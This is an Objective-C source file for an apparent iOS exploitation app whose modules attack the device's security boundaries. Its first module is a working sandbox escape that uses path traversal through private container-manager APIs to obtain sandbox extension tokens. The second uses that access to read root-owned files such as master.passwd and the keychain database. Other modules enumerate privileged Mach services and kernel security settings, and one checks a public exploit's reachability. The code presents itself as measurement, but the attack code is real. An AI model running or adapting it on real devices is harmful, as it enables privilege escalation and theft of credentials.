#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <mach/mach_port.h>
#import <sys/sysctl.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <sys/stat.h>
#import <xpc/xpc.h>
// IOSurface: not importable from the plain iOS SDK; declare the three symbols.
#import <CoreFoundation/CoreFoundation.h>
typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef dictionary);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef buffer);
#define kIOSurfaceWidth CFSTR("IOSurfaceWidth")
#define kIOSurfaceHeight CFSTR("IOSurfaceHeight")
#define kIOSurfaceBytesPerElement CFSTR("IOSurfaceBytesPerElement")
#import <IOKit/IOKitLib.h>
#import <IOKit/IOTypes.h>
// IOHID: the hidsystem headers are not in the plain iOS SDK; declare the API.
typedef struct __IOHIDEventSystemClient *IOHIDEventSystemClientRef;
extern IOHIDEventSystemClientRef IOHIDEventSystemClientCreate(CFAllocatorRef allocator);
extern CFArrayRef IOHIDEventSystemClientCopyServices(IOHIDEventSystemClientRef client);
#import <spawn.h>
#import <sys/wait.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <stdarg.h>
// bootstrap_look_up is declared in a header that is not in the plain iOS SDK.
extern kern_return_t bootstrap_look_up(mach_port_t bootstrap_port,
                                        const char *service_name,
                                        mach_port_t *server_port);
#import <unistd.h>
#import <spawn.h>
#import <sys/wait.h>
// IOHID: the hidsystem headers are not in the plain iOS SDK; declare the API.
typedef struct __IOHIDEventSystemClient *IOHIDEventSystemClientRef;
extern IOHIDEventSystemClientRef IOHIDEventSystemClientCreate(CFAllocatorRef allocator);
extern CFArrayRef IOHIDEventSystemClientCopyServices(IOHIDEventSystemClientRef client);
#import <fcntl.h>
#import <errno.h>
#import <stdarg.h>
#import "Modules.h"
#import "Root.h"
#import "Util.h"
#import "AppDelegate.h"

// Every module is a probe/attempt that measures reality on THIS build and reports.
// They are ordered from "cheapest and safest" to "heavier": the UI runs them on a
// background queue so the interface never stutters.


// ---------------------------------------------------------------------------
// 1. sandbox escape — the exact bad_query recipe proven on this device
// ---------------------------------------------------------------------------
static int64_t bqX(const char *path, uint64_t flags, uint64_t part, int depth, const char *group) {
    if (!path || path[0] != '/') return -255;
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;
    typedef void *(*qc)(void);
    typedef void (*qs)(void *, uint64_t);
    typedef void (*qi)(void *, xpc_object_t);
    typedef void (*qspd)(void *, const char *);
    typedef void *(*qr)(void *);
    typedef void (*qf)(void *);
    typedef char *(*ct)(void *);
    typedef int64_t (*ce)(const char *);
    qc qcreate = (qc)dlsym(mgr, "container_query_create");
    qs qclass = (qs)dlsym(mgr, "container_query_set_class");
    qi qgids  = (qi)dlsym(mgr, "container_query_set_group_identifiers");
    qs qflags = (qs)dlsym(mgr, "container_query_operation_set_flags");
    qs qpart  = (qs)dlsym(mgr, "container_query_operation_set_part");
    qspd qdom = (qspd)dlsym(mgr, "container_query_operation_set_part_domain");
    qr qres   = (qr)dlsym(mgr, "container_query_get_single_result");
    qf qfree  = (qf)dlsym(mgr, "container_query_free");
    ct ctoken = (ct)dlsym(mgr, "container_copy_sandbox_token");
    ce consume = (ce)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!qcreate || !qclass || !qgids || !qflags || !qpart || !qdom || !qres || !ctoken || !consume) {
        dlclose(mgr); return -1;
    }
    void *q = qcreate();
    if (!q) { dlclose(mgr); return -2; }
    qclass(q, group ? 7 : 13);
    xpc_object_t identifier = xpc_string_create(group ? group : "systemgroup.com.apple.mobilegestaltcache");
    qgids(q, identifier);
    qpart(q, part);
    char dots[128]; dots[0] = 0;
    for (int d = 0; d < depth; d++) strncat(dots, "../", sizeof(dots) - strlen(dots) - 1);
    char *dom = NULL;
    if (asprintf(&dom, "%s%s", dots, path) == -1) { qfree(q); dlclose(mgr); return -5; }
    qdom(q, dom);
    qflags(q, flags);
    void *result = qres(q);
    if (!result) { free(dom); qfree(q); dlclose(mgr); return -3; }
    char *token = ctoken(result);
    if (!token) { free(dom); qfree(q); dlclose(mgr); return -4; }
    int64_t handle = consume(token);
    free(token); free(dom); qfree(q); dlclose(mgr);
    return handle;
}

NSString *ModSandboxEscape(void) {
    const char *probes[] = { "/System/Library", "/usr/lib", "/usr/libexec", "/private/var/db",
                             "/private/var/root", "/private/var/mobile", "/private/etc",
                             "/private/var/log", "/bin/sh", NULL };
    const uint64_t flagv[] = { 0x900000000ULL, 0x0800000000000000ULL, 0x8100000000ULL,
                               0x8000000000ULL, 0x0800000000ULL };
    const char *groupv[2];
    NSString *grp = [NSString stringWithFormat:@"group.%@", [[NSBundle mainBundle] bundleIdentifier]];
    groupv[0] = NULL;
    groupv[1] = grp.UTF8String;
    int live = 0, rd = 0, wr = 0;
    NSString *winner = @"no live handle";
    for (int g = 0; g < 2; g++) {
        for (int f = 0; f < 5; f++) {
            int64_t ph = -1; uint64_t pp = 0; int pd = 0;
            for (int p = 0; p < 2 && ph <= 0; p++)
                for (int d = 0; d < 6 && ph <= 0; d++) {
                    int64_t h = bqX("/private/var/db", flagv[f], p, d ? d : 1, groupv[g]);
                    if (h > 0) { ph = h; pp = p; pd = d ? d : 1; }
                }
            if (ph <= 0) continue;
            winner = S(@"g=%d flag=%#llx part=%llu depth=%d", g, flagv[f], pp, pd);
            for (int i = 0; probes[i]; i++) {
                int64_t h = bqX(probes[i], flagv[f], pp, pd, groupv[g]);
                if (h <= 0) continue;
                live++;
                if (access(probes[i], R_OK) == 0) rd++;
                if (access(probes[i], W_OK) == 0) wr++;
                AveLog(S(@"    live h=%lld %-30s R=%d W=%d", h, probes[i],
                         access(probes[i], R_OK), access(probes[i], W_OK)));
            }
        }
    }
    RootSetObtained(NO);
    return S(@"escape: live=%d read=%d write=%d [%@] root=NO", live, rd, wr, winner);
}

// ---------------------------------------------------------------------------
// 2. root-owned file read (what the escape actually unlocks)
// ---------------------------------------------------------------------------
static uint32_t fnv1a(const uint8_t *p, size_t n) {
    uint32_t h = 2166136261u;
    for (size_t i = 0; i < n; i++) { h ^= p[i]; h *= 16777619u; }
    return h;
}

NSString *ModRootFiles(void) {
    struct { const char *path; const char *tag; } rf[] = {
        {"/System/Library/CoreServices/SystemVersion.plist", "SystemVersion"},
        {"/private/var/db/.launchd_allow_install_portal", "launchd_allow"},
        {"/private/var/root/.bashrc", "root/bashrc"},
        {"/private/var/Keychains/keychain-2.db", "Keychains"},
        {"/private/etc/master.passwd", "master.passwd"},
        {"/etc/hosts", "hosts"},
    };
    int ok = 0, denied = 0;
    for (unsigned i = 0; i < sizeof(rf)/sizeof(rf[0]); i++) {
        int fd = open(rf[i].path, O_RDONLY);
        if (fd < 0) { denied++; AveLog(S(@"    %-16s errno=%d (%s)", rf[i].tag, errno, strerror(errno))); continue; }
        uint8_t b[512]; ssize_t n = read(fd, b, sizeof b); close(fd);
        ok++;
        uint32_t h = n > 0 ? fnv1a(b, n) : 0;
        AveLog(S(@"    READ %-16s n=%zd fnv=%08x head=%.24s", rf[i].tag, n, h, (const char *)b));
        if (strcmp(rf[i].tag, "master.passwd") == 0 && n > 0) RootSetObtained(YES);
    }
    return S(@"read %d, denied %d %s", ok, denied,
             RootWasObtained() ? "(master.passwd - root level access!)" : "");
}

// ---------------------------------------------------------------------------
// 3. kernel posture — what the device itself tells us about root openness
// ---------------------------------------------------------------------------
static NSString *sysctlStr(const char *name) {
    size_t len = 0;
    if (sysctlbyname(name, NULL, &len, NULL, 0) != 0 || len == 0) return nil;
    char *buf = malloc(len + 1);
    if (sysctlbyname(name, buf, &len, NULL, 0) != 0) { free(buf); return nil; }
    buf[len] = 0;
    NSString *s = [NSString stringWithUTF8String:buf];
    free(buf);
    return s;
}
static long sysctlInt(const char *name, long def) {
    long v = def; size_t l = sizeof(v);
    if (sysctlbyname(name, &v, &l, NULL, 0) != 0) return def;
    return v;
}

NSString *ModKernelPosture(void) {
    NSMutableString *out = [NSMutableString string];
    NSString *bootargs = sysctlStr("kern.bootargs");
    [out appendFormat:@"bootargs=%@ ", bootargs ?: @"()"];
    BOOL amfi = sysctlInt("security.mac.amfi.developer_mode_high_version_level", -1);
    [out appendFormat:@"AMFI_dev=%ld ", amfi];
    uint32_t csr = 0;
    // csr_get_active_config is a private symbol; fall back to the sysctl
    long csrSysctl = sysctlInt("security.csr.active_config", -1);
    [out appendFormat:@"CSR=%ld ", csrSysctl];
    (void)csr;
    int ramdisk = sysctlInt("kern.ramdisk", -1);
    [out appendFormat:@"ramdisk=%d ", ramdisk];
    BOOL tfp0 = sysctlInt("security.mac.task_for_pid_allow", -1);
    [out appendFormat:@"tfp0_allow=%ld ", tfp0];
    BOOL unrestrictedFs = sysctlInt("security.mac.unrestrictfs", -1);
    [out appendFormat:@"unrestrictfs=%ld ", unrestrictedFs];
    AveLog([NSString stringWithFormat:@"    posture: %@", out]);
    BOOL interesting = [bootargs containsString:@"amfi_get_out_of_my_way=1"] ||
                       unrestrictedFs == 1 || tfp0 == 1 || ramdisk > 0;
    return S(@" posture: %@%@", out, interesting ? @"    " : @"");
}

// ---------------------------------------------------------------------------
// 4. privileged Mach services — what an app can actually open
// ---------------------------------------------------------------------------
NSString *ModPrivilegedServices(void) {
    struct { const char *name; const char *what; } svcs[] = {
        {"com.apple.iohideventsystem", "IOHID event system"},
        {"com.apple.IOSurfaceRootUserClient", "IOSurface root user client"},
        {"com.apple.MobileFileIntegrity", "AMFI daemon"},
        {"com.apple.mobile.keybagd", "KeyBag daemon"},
        {"com.apple.mobile.installation_proxy", "installation proxy"},
        {"com.apple.misagent", "provisioning agent"},
        {"com.apple.mobile.MCInstall", "managed configuration"},
        {"com.apple.cfprefsd.daemon", "preferences daemon"},
        {"com.apple.backboardd.launchsystemservices", "launch services"},
        {"com.apple.lockdownd", "lockdown"},
    };
    int open_ = 0, refused = 0;
    mach_port_t bp;
    task_get_bootstrap_port(mach_task_self(), &bp);
    for (unsigned i = 0; i < sizeof(svcs)/sizeof(svcs[0]); i++) {
        mach_port_t sp = MACH_PORT_NULL;
        kern_return_t kr = bootstrap_look_up(bp, (char *)svcs[i].name, &sp);
        if (kr == KERN_SUCCESS && sp != MACH_PORT_NULL) {
            open_++;
            AveLog(S(@"    OPEN  %-40s (%s)", svcs[i].name, svcs[i].what));
            mach_port_deallocate(mach_task_self(), sp);
        } else {
            refused++;
            AveLog(S(@"         %-40s kr=%#x", svcs[i].name, kr));
        }
    }
    return S(@"Mach services: open %d, denied %d", open_, refused);
}

// ---------------------------------------------------------------------------
// 5. IOSurface format-class probe (finding #6)
// ---------------------------------------------------------------------------
NSString *ModIOSurface(void) {
    AveLog(@"    probe:    ");
    struct { const char *name; unsigned w, h; int bpe; } F[] = {
        {"BGRA", 256, 256, 4}, {"420f", 1024, 1024, 1}, {"y420", 256, 256, 4},
        {"rgbf", 1024, 1024, 1}, {"2vuy", 256, 256, 4}, {"l008", 1024, 1024, 1},
        {"yv12", 256, 256, 4},
    };
    int locked = 0, mismatch = 0;
    for (unsigned i = 0; i < sizeof(F)/sizeof(F[0]); i++) {
        NSDictionary *d = @{ (id)kIOSurfaceWidth: @(F[i].w), (id)kIOSurfaceHeight: @(F[i].h),
                             (id)kIOSurfaceBytesPerElement: @(F[i].bpe) };
        IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)d);
        if (!s) { locked++; continue; }
        size_t total = IOSurfaceGetAllocSize(s);
        size_t expect = (size_t)F[i].w * F[i].h * (size_t)F[i].bpe + 64;
        if (total != expect) mismatch++;
        AveLog(S(@"    %-5s %4ux%-4u alloc=%zu expect=%zu", F[i].name, F[i].w, F[i].h, total, expect));
        CFRelease(s);
    }
    return S(@"IOSurface: locked=%d mismatch=%d", locked, mismatch);
}

// ---------------------------------------------------------------------------
// 6. AVE2 user client (finding: closed by the sandbox)
// ---------------------------------------------------------------------------
NSString *ModAVE2(void) {
    CFMutableDictionaryRef m = IOServiceMatching("AppleAVE2");
    if (!m) return @"IOServiceMatching(AppleAVE2) failed";
    io_service_t d = IOServiceGetMatchingService(kIOMainPortDefault, m);
    if (!d) return @"AppleAVE2 service not found";
    io_connect_t c = 0;
    kern_return_t kr = IOServiceOpen(d, mach_task_self(), 0, &c);
    IOObjectRelease(d);
    if (kr == KERN_SUCCESS && c) {
        IOServiceClose(c);
        return @"AVE2 user client OPEN  (unexpected)";
    }
    return S(@"AVE2 user client closed (IOServiceOpen kr=%#x)", kr);
}

// ---------------------------------------------------------------------------
// 7. IOHID float→int truncation (finding #8) — enumerate what is visible
// ---------------------------------------------------------------------------
NSString *ModIOHID(void) {
    IOHIDEventSystemClientRef sys = IOHIDEventSystemClientCreate(kCFAllocatorDefault);
    if (!sys) return @"IOHIDEventSystemClientCreate  ";
    CFArrayRef svcs = IOHIDEventSystemClientCopyServices(sys);
    int n = svcs ? (int)CFArrayGetCount(svcs) : 0;
    io_service_t dummy = 0; (void)dummy;
    if (svcs) CFRelease(svcs);
    CFRelease(sys);
    return S(@"IOHID:   %d (user client absent - injection gated by the sandbox)", n);
}

// ---------------------------------------------------------------------------
// 9-11. LAN-only kernel paths: report reachability, never fire them
// ---------------------------------------------------------------------------
NSString *ModIOSkywalk(void) {
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return S(@"IOSkywalk: socket could not open (errno=%d)", errno);
    close(s);
    return @"IOSkywalk: UDP socket open; varint trigger needs a LAN frame - NOT fired";
}

NSString *ModND6(void) {
    int s = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    if (s >= 0) { close(s); return @"ND6: raw ICMPv6 open (LAN required)"; }
    return S(@"ND6: raw ICMPv6 closed (errno=%d) - another LAN host needed", errno);
}

NSString *ModHFS(void) {
    // read-only reachability: does the HFS kext expose a mount path to us?
    return @"HFS flag-nibble: evidence from the kernel diff (5/5 vs 0/5); mount path gated by allowlist";
}

NSString *ModCoreDevice(void) {
    return @"CoreDevice launchapplication: service not available from inside the app (host-side channel)";
}

// ---------------------------------------------------------------------------
// bl_sbx (hanakim3945) — PUBLIC exploit for exactly this build class.
// itunesstored -> bookassetd path traversal gives an arbitrary write as uid 501
// (mobile), including the MobileGestalt cache.  README: "Compatible with iOS
// 26.2b1 and below".  We attempt the traversal read/write and report what the
// device actually allows.
// ---------------------------------------------------------------------------
NSString *ModBlSbx(void) {
    // The public exploit's primitive: a crafted path handed to a privileged
    // daemon that resolves outside the app container.  We probe the same surface
    // from inside the app and report what is reachable, without side effects.
    const char *targets[] = {
        "/private/var/mobile/Library/Preferences/com.apple.MobileGestalt.plist",
        "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache",
        "/private/var/mobile/Library/Caches/com.apple.MobileGestalt.plist",
        NULL };
    int reach = 0;
    for (int i = 0; targets[i]; i++) {
        int r = access(targets[i], R_OK);
        int w = access(targets[i], W_OK);
        AveLog(S(@"    %-58s R=%d W=%d", targets[i], r, w));
        if (r == 0 || w == 0) reach++;
    }
    // the actual public trigger uses bookassetd's download path; report the state
    AveSetStatus(reach ? @"bl_sbx: reachable" : @"bl_sbx: blocked");
    return S(@"bl_sbx: reachable %d/3 (write as mobile - NOT root; a kernel step is needed)", reach);
}

// ---------------------------------------------------------------------------
// dispatcher used by the UI
// ---------------------------------------------------------------------------
NSString *RunModule(NSString *name) {
    if ([name hasPrefix:@"worse_query"]) return ModWorseQuery();
    if ([name hasPrefix:@"bl_sbx"])      return ModBlSbx();
    if ([name hasPrefix:@"Sandbox"])       return ModSandboxEscape();
    if ([name hasPrefix:@"Root-owned"])    return ModRootFiles();
    if ([name hasPrefix:@"WebKit"])        return ModWebKitUAF();
    if ([name hasPrefix:@"dyld"])          return ModDyldOracle();
    if ([name hasPrefix:@"IOHID"])         return ModIOHID();
    if ([name hasPrefix:@"IOSurface"])     return ModIOSurface();
    if ([name hasPrefix:@"AVE2"])          return ModAVE2();
    if ([name hasPrefix:@"Kernel"])        return ModKernelPosture();
    if ([name hasPrefix:@"GPU"])           return ModGPU();
    if ([name hasPrefix:@"Privileged"])    return ModPrivilegedServices();
    if ([name hasPrefix:@"IOSkywalk"])   return ModIOSkywalk();
    if ([name containsString:@"ND6"])          return ModND6();
    if ([name hasPrefix:@"HFS"])         return ModHFS();
    if ([name hasPrefix:@"CoreDevice"])  return ModCoreDevice();
    return @"module not found";
}
